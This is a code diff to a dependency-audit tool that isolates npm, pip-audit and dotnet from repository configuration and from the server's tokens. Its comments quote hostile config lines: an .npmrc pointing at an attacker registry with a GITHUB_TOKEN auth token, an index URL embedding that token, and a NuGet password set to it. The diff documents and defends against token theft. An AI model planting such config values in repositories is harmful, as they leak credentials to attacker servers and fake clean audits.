@@ -13,7 +13,9 @@
  *     Trivy's, so its vulnerabilities are counted rather than merely
  *     captured. To avoid double-counting, an npm finding that is an advisory
  *     Trivy already reported for that package and manifest is dropped (Trivy
- *     is canonical); every other npm finding is kept;
+ *     is canonical); every other npm finding is kept. It runs on a copy of
+ *     the manifests, so the repository's `.npmrc` is never read
+ *     ({@link runNpmAudit});
  *   - `pip-audit --format json`, run per `requirements*.txt` file (`-r`) when
  *     any exist, else against the project directory for a `pyproject.toml`
  *     project — NEVER bare, which audits whatever Python is on PATH (the MCP
@@ -41,12 +43,17 @@
  * pip-audit resolves `-r` requirements by building a temporary virtualenv
  * and installing them into it from PyPI — network access, and an sdist's own
  * build step runs there. The tool description says so, next to the restore.
+ * Every package manager here runs in the package-manager environment
+ * ({@link auditEnv}), never this server's.
  *
  * All raw outputs are persisted under `.guardian/reports/depsaudit-<scan>/`.
  */
 
 import { writeFileSync } from 'node:fs';
 import { packageManagerEnvOptions } from '../fixpr/childEnv.js';
+import { checkNpmSources, npmSourcesRefusal } from '../fixpr/repoPackageConfig.js';
+import { packageManagerEnv } from '../fixpr/testCommandEnv.js';
+import { gitRootAbove, npmConfigNotRead, npmPlanningCopy } from '../deps/npmPlanningCopy.js';
 import { presentInProject, readProjectTextOrUndefined } from '../platform/projectFs.js';
 import { join, relative } from 'node:path';
 import {
@@ -64,7 +71,7 @@ import { NPM_AUDIT_TOOL_NAME, npmAuditParser } from '../runners/scannerParsers/n
 import { pipAuditParser } from '../runners/scannerParsers/pipAudit.js';
 import { TRIVY_TOOL_NAME, trivyParser } from '../runners/scannerParsers/trivy.js';
 import { runProcess } from '../runners/processRunner.js';
-import { honouredRootFiles, nameRepoConfig, withProjectConfig, type HonouredFile } from '../runners/repoConfig.js';
+import { nameRepoConfig, withProjectConfig, type HonouredFile } from '../runners/repoConfig.js';
 import { checkRequirements, findRequirementFiles, INDEX_KINDS, SOURCE_KINDS, type PipRefusal } from '../deps/pipRequirements.js';
 import { checkPyproject, checkSetupCfg } from '../deps/pythonProject.js';
 import { judgeTrivyFs, runTrivy, type TrivyFsJudgement } from '../runners/trivyRun.js';
@@ -178,11 +185,12 @@ registerToolModule(
     name: 'deps_audit',
     title: 'Dependency audit (Trivy and native auditors)',
     description:
-      "Trivy fs plus the stack's own auditors: npm audit; pip-audit in a temporary virtualenv it installs " +
-      "the requirements into from PyPI (an sdist's build runs); for .NET, a locked restore and dotnet list " +
-      "package --vulnerable, which runs the project's MSBuild and contacts its NuGet feeds (an out-of-sync " +
-      'lock is a gap); for Go, govulncheck, which reports the vulnerable functions the code calls. Returns ' +
-      'findings, indexed CVEs and `bot_configured` (Renovate or Dependabot).',
+      "Trivy fs plus the stack's own auditors: npm audit on a copy of the manifests, never the repo's .npmrc; " +
+      "pip-audit in a temporary virtualenv it installs the requirements into from PyPI (an sdist's build runs); " +
+      "for .NET, a locked restore and dotnet list package --vulnerable, which runs the project's MSBuild and " +
+      "contacts its NuGet feeds (an out-of-sync lock is a gap) — none given the server's tokens; for Go, " +
+      'govulncheck, which reports the vulnerable functions the code calls. Returns findings, indexed CVEs and ' +
+      '`bot_configured` (Renovate or Dependabot).',
     // Its own type, not scan_deps' 'deps': the two shared cache entries and
     // answered for each other. Readers that want "the latest deps_audit" use
     // `isDepsAuditScan`, which also recognises the 2.0.x rows typed 'deps'.
@@ -233,16 +241,18 @@ registerToolModule(
       // --- Native auditors ----------------------------------------------
       // npm audit is parsed into Findings; so is pip-audit, now that it is
       // pointed at this project's own manifests instead of the host Python.
-      if (presentInProject(ctx.projectPath, 'package.json')) {
-        await tryNativeAudit({
-          command: 'npm',
-          args: ['audit', '--json', '--audit-level=info'],
+      // npm runs on a copy of the manifests, so the repository's own npm
+      // configuration is never read — named in the result (`runNpmAudit`).
+      const hasPackageJson = presentInProject(ctx.projectPath, 'package.json');
+      const npmConfigSkipped = hasPackageJson ? npmConfigNotRead(ctx.projectPath) : [];
+      if (hasPackageJson) {
+        await runNpmAudit({
           outFile: join(reportDir, 'npm-audit.json'),
           ctx,
+          notRead: npmConfigSkipped,
           tools_run,
           missing_tools,
           parser_inputs,
-          parser: npmAuditParser,
         });
       }
 
@@ -288,17 +298,19 @@ registerToolModule(
           bot_configured,
           ...(manifestCoverageGaps.length > 0 ? { manifest_coverage_gaps: manifestCoverageGaps } : {}),
           ...(dotnetFailures.length > 0 ? { dotnet_restore_failures: dotnetFailures } : {}),
+          // npm audited against the user's own configuration, not these (`runNpmAudit`).
+          ...(npmConfigSkipped.length > 0 ? { package_config_not_read: npmConfigSkipped } : {}),
         },
       };
     },
   }),
 );
 
-interface NativeAuditOptions {
-  command: string;
-  args: string[];
+interface NpmAuditOptions {
   outFile: string;
   ctx: Parameters<NonNullable<Parameters<typeof makeScanTool>[0]['invoke']>>[1];
+  /** The repository's npm configuration files the copy leaves behind (`npmConfigNotRead`). */
+  notRead: readonly string[];
   tools_run: ToolRun[];
   /**
    * Accumulator for auditors that were expected here (the manifest exists) but
@@ -306,11 +318,9 @@ interface NativeAuditOptions {
    * missing auditor is a real coverage gap, so it must be surfaced rather than
    * silently swallowed (otherwise a "0 findings" reads as a clean bill).
    */
-  missing_tools?: string[];
-  /** When set, the captured JSON is fed to this parser and counted as Findings. */
-  parser?: ScannerInvocation['parser_inputs'][number]['parser'];
-  /** Accumulator the parsed input is pushed onto (required with `parser`). */
-  parser_inputs?: ScannerInvocation['parser_inputs'];
+  missing_tools: string[];
+  /** Accumulator the parsed report is pushed onto. */
+  parser_inputs: ScannerInvocation['parser_inputs'];
 }
 
 /**
@@ -332,21 +342,18 @@ function looksLikeNpmAuditReport(raw: string): boolean {
   }
 }
 
-/** The public npm registry: npm audit answered by it is not worth a note. */
+/** The public npm registry: a project naming it loses nothing by not being read. */
 const NPM_PUBLIC_REGISTRY = /^https?:\/\/registry\.npmjs\.org\/?$/i;
 
 /**
- * The registry the project's own `.npmrc` sends `npm audit` to, when it is
- * not the public one — credentials in the URL removed — or null.
+ * The registry the project's own `.npmrc` names, when it is not the public
+ * one — credentials in the URL removed — or null. Only the unscoped
+ * `registry` key: a `@scope:registry` line does not move the audit endpoint.
  *
- * `npm audit` runs in the project, so the project's `.npmrc` decides which
- * server answers it: a private registry is legitimate and stays honoured, but
- * the answer is that server's, and a repository could equally point it at a
- * server of its own that answers "no vulnerabilities". Named in the result,
- * never silent. Only the unscoped `registry` key: a `@scope:registry` line
- * does not move the audit endpoint. The user's own `~/.npmrc` and
- * `npm_config_registry` are the user's choice, not the project's, and are
- * not read here.
+ * `npm audit` no longer reads that file (`runNpmAudit`), so a project whose
+ * `.npmrc` names a private registry is audited against the user's own
+ * registry instead; the result says which registry the project named, so
+ * "set it in your own configuration" has something to act on.
  */
 export function projectNpmRegistry(projectPath: string): string | null {
   // The repository's file: bounded, never through a link out of the project.
@@ -366,104 +373,121 @@ export function projectNpmRegistry(projectPath: string): string | null {
   return registry.replace(/^([a-z][a-z0-9+.-]*:\/\/)[^/@]*@/i, '$1');
 }
 
-async function tryNativeAudit(opts: NativeAuditOptions): Promise<void> {
-  const bin = await scannerAvailable(opts.command);
-  if (!bin) {
-    opts.tools_run.push({
-      name: opts.command,
-      status: 'skipped',
-      reason: 'not_installed',
-    });
+/**
+ * `run` naming the repository's npm configuration npm audit did not read —
+ * and, when the project's `.npmrc` names a registry of its own, that it was
+ * not asked. Unchanged when the repository carries none.
+ */
+function withNpmConfigNotRead(run: ToolRun, projectPath: string, notRead: readonly string[]): ToolRun {
+  if (notRead.length === 0) return run;
+  const registry = notRead.includes('.npmrc') ? projectNpmRegistry(projectPath) : null;
+  const notes = [
+    `not read: the project's ${notRead.join(', ')} — npm audit ran on a copy of the manifests, with your own npm configuration (~/.npmrc, NPM_CONFIG_*)`,
+    ...(registry !== null
+      ? [`the project's .npmrc names ${registry} as its registry, which was not asked: to audit against it, set it in your own ~/.npmrc`]
+      : []),
+  ];
+  const reason = [run.reason, ...notes].filter((s) => s !== undefined && s.length > 0).join('; ');
+  return { ...run, reason };
+}
+
+/**
+ * `npm audit --json`, on a copy of the project's manifest and lock files
+ * (`deps/npmPlanningCopy.ts`), in the package-manager environment
+ * ({@link auditEnv}) — never in the project, never with this server's
+ * environment. Measured on npm 11.20.0 (2026-10-27), run in the project as it
+ * was: npm read the repository's `.npmrc` (`registry=http://<attacker>/`,
+ * `//<attacker>/:_authToken=${GITHUB_TOKEN}`), expanded the token from the
+ * server's environment and POSTed the dependency list to the attacker's
+ * bulk-advisory endpoint with `Authorization: Bearer <the token>` — and the
+ * attacker's `{}` read as a clean audit. The project's `.npmrc` used to be
+ * honoured on purpose (a private registry is legitimate); now the user's own
+ * configuration is the only one npm reads, and the files it left behind are
+ * named ({@link withNpmConfigNotRead}, and the result's
+ * `package_config_not_read`). Not run at all when a dependency points at a
+ * network path, or a file npm reads could not be checked for one
+ * (`fixpr/repoPackageConfig.ts#checkNpmSources`): opening it on Windows
+ * authenticates to the host — deps_update_plan's rule.
+ */
+async function runNpmAudit(opts: NpmAuditOptions): Promise<void> {
+  const { ctx, tools_run, missing_tools } = opts;
+  if (!(await scannerAvailable('npm'))) {
+    tools_run.push({ name: 'npm', status: 'skipped', reason: 'not_installed' });
     // The manifest exists but its auditor is absent — a real coverage gap.
-    opts.missing_tools?.push(opts.command);
+    missing_tools.push('npm');
     return;
   }
-  const isNpmStdout = opts.command === 'npm';
-  const result = await runProcess({
-    command: opts.command,
-    args: opts.args,
-    cwd: opts.ctx.projectPath,
-    ...auditEnv(opts.ctx),
-    signal: opts.ctx.signal,
-    onLog: opts.ctx.onLog,
-  });
+  const named = (run: ToolRun): ToolRun => withNpmConfigNotRead(run, ctx.projectPath, opts.notRead);
+  const refused = npmSourcesRefusal(checkNpmSources(ctx.projectPath, gitRootAbove(ctx.projectPath) ?? ctx.projectPath));
+  const copy = refused === null ? npmPlanningCopy(ctx.projectPath) : { ok: false as const, reason: refused };
+  if (!copy.ok) {
+    tools_run.push(named({ name: 'npm', status: 'failed', reason: `not run: ${copy.reason}` }));
+    missing_tools.push('npm');
+    return;
+  }
+  let result: Awaited<ReturnType<typeof runProcess>>;
+  try {
+    result = await runProcess({
+      command: 'npm',
+      args: ['audit', '--json', '--audit-level=info'],
+      cwd: copy.dir,
+      ...auditEnv(),
+      signal: ctx.signal,
+      onLog: ctx.onLog,
+    });
+  } finally {
+    copy.dispose();
+  }
   // npm audit writes to stdout; redirect ourselves.
-  if (isNpmStdout && result.stdout.length > 0) {
+  if (result.stdout.length > 0) {
     try {
       writeFileSync(opts.outFile, result.stdout, 'utf8');
     } catch {
       /* swallow */
     }
   }
-  // Exit code 0/1 (or `completed`) is a run that produced output — npm and
-  // pip-audit both exit 1 when vulnerabilities are present, which is
-  // information, not failure. But npm ALSO exits 1 on a hard error (no
-  // lockfile), so for npm we additionally require the output to be a real
-  // audit report. An error masquerading as exit 1 must count as a gap, not a
-  // clean "0 findings".
-  const exitOk =
-    result.outcome === 'completed' || result.exitCode === 0 || result.exitCode === 1;
-  const ok = isNpmStdout ? exitOk && looksLikeNpmAuditReport(result.stdout) : exitOk;
-
-  // Feed the captured JSON to its parser so the findings are counted. npm
-  // prints to stdout; file-output tools (pip-audit) are read back from disk.
-  let parsed = false;
-  if (ok && opts.parser && opts.parser_inputs) {
-    const rawText = isNpmStdout ? result.stdout : readJsonSafe(opts.outFile);
-    if (rawText && rawText.length > 0) {
-      opts.parser_inputs.push({ parser: opts.parser, input: rawText });
-      parsed = true;
-    }
-  }
-
-  // The project's .npmrc is named whenever npm audit read one (round 5, item
-  // 2: `runners/repoConfig.ts`) — its registry, `omit=dev`, `audit-level`
-  // decide what is audited — and whoever answered, when the project chose a
-  // registry other than npm's (see `projectNpmRegistry`).
-  const registry = isNpmStdout ? projectNpmRegistry(opts.ctx.projectPath) : null;
-  const npmrc = isNpmStdout ? honouredRootFiles(opts.ctx.projectPath, 'npm') : [];
-  const registryNote = (run: ToolRun): ToolRun => {
-    const named = withProjectConfig(run, npmrc);
-    if (registry === null) return named;
-    const note = `npm audit answered by ${registry} (from the project's .npmrc)`;
-    return {
-      ...named,
-      reason: named.reason !== undefined && named.reason.length > 0 ? `${named.reason}; ${note}` : note,
-      honoured_config: [...new Set([...(named.honoured_config ?? []), '.npmrc'])],
-    };
-  };
+  // Exit code 0/1 (or `completed`) is a run that produced output — npm exits
+  // 1 when vulnerabilities are present, which is information, not failure.
+  // But npm ALSO exits 1 on a hard error (no lockfile), so the output must be
+  // a real audit report too. An error masquerading as exit 1 must count as a
+  // gap, not a clean "0 findings".
+  const exitOk = result.outcome === 'completed' || result.exitCode === 0 || result.exitCode === 1;
+  const ok = exitOk && looksLikeNpmAuditReport(result.stdout);
   if (ok) {
-    opts.tools_run.push(
-      registryNote({
-        name: opts.command,
-        status: 'ok',
-        reason: parsed ? 'parsed into findings' : 'captured (evidence only)',
-      }),
-    );
+    opts.parser_inputs.push({ parser: npmAuditParser, input: result.stdout });
+    tools_run.push(named({ name: 'npm', status: 'ok', reason: 'parsed into findings' }));
   } else {
-    const reason =
-      isNpmStdout && exitOk
-        ? 'ran but produced no audit report (missing lockfile?)'
-        : 'failed to run';
-    opts.tools_run.push(registryNote({ name: opts.command, status: 'failed', reason }));
+    const reason = exitOk ? 'ran but produced no audit report (missing lockfile?)' : 'failed to run';
+    tools_run.push(named({ name: 'npm', status: 'failed', reason }));
     // A failed auditor is a coverage gap — surface it so the roll-up and the
     // executive summary do not read the result as fully covered.
-    opts.missing_tools?.push(opts.command);
+    missing_tools.push('npm');
   }
 }
 
 /**
- * The environment of a package-manager process this tool starts: the scan's
- * own, except while `create_fix_pr` re-scans a fix — then the
- * package-manager environment (`fixpr/childEnv.ts`), with `extendEnv: false`,
- * so `npm audit`, `pip-audit` (which installs the requirements into a
- * temporary virtualenv, running an sdist's build code) and `dotnet restore`
- * see no token or credential beyond the user's own package-manager
- * configuration.
+ * The environment of every package-manager process this tool starts — `npm
+ * audit`, `pip-audit` (which installs the requirements into a temporary
+ * virtualenv, running an sdist's build code), `dotnet restore` and `dotnet
+ * list` (which run the project's MSBuild): create_fix_pr's when it is the
+ * caller (`fixpr/childEnv.ts`), else the same allowlist built here
+ * (`fixpr/testCommandEnv.ts#packageManagerEnv`), always with `extendEnv:
+ * false`. It used to be this server's whole environment outside
+ * create_fix_pr, and a repository's own configuration expands a variable
+ * into a request — measured 2026-10-27, each answering a local server's 401:
+ * an `.npmrc`'s `${GITHUB_TOKEN}` (above); a requirements file's
+ * `--index-url http://x:${GITHUB_TOKEN}@<host>/simple`, which pip 26.2.1 sent
+ * as `Basic x:<the token>`; a `NuGet.config` feed's `ClearTextPassword` of
+ * `%GITHUB_TOKEN%`, which `dotnet restore` (SDK 10.0.403) sent the same way.
+ * With the variable absent each sent the literal reference. With this
+ * allowlist no token or cloud credential the server was started with reaches
+ * them, nor the code an sdist's build or the project's MSBuild runs; the
+ * package managers' own variables, and those the user's own `~/.npmrc`
+ * names, still do.
  */
-function auditEnv(ctx: { scriptEnv: NodeJS.ProcessEnv }): { env: NodeJS.ProcessEnv; extendEnv?: false } {
+function auditEnv(): { env: NodeJS.ProcessEnv; extendEnv: false } {
   const pm = packageManagerEnvOptions();
-  return 'env' in pm ? { env: pm.env, extendEnv: false } : { env: ctx.scriptEnv };
+  return { env: 'env' in pm ? pm.env : packageManagerEnv(), extendEnv: false };
 }
 
 // --------------------------------------------------------------- pip-audit
@@ -572,7 +596,7 @@ async function runPipAudit(opts: {
       command: 'pip-audit',
       args,
       cwd: ctx.projectPath,
-      ...auditEnv(ctx),
+      ...auditEnv(),
       signal: ctx.signal,
       onLog: ctx.onLog,
     });
@@ -749,7 +773,7 @@ async function runDotnetSca(opts: {
       command: 'dotnet',
       args: plan.args,
       cwd: ctx.projectPath,
-      ...auditEnv(ctx),
+      ...auditEnv(),
       signal: ctx.signal,
       onLog: ctx.onLog,
     });
@@ -776,7 +800,7 @@ async function runDotnetSca(opts: {
       command: 'dotnet',
       args: ['list', target, 'package', '--vulnerable', '--include-transitive', '--format', 'json', '--no-restore'],
       cwd: ctx.projectPath,
-      ...auditEnv(ctx),
+      ...auditEnv(),
       signal: ctx.signal,
       onLog: ctx.onLog,
     });
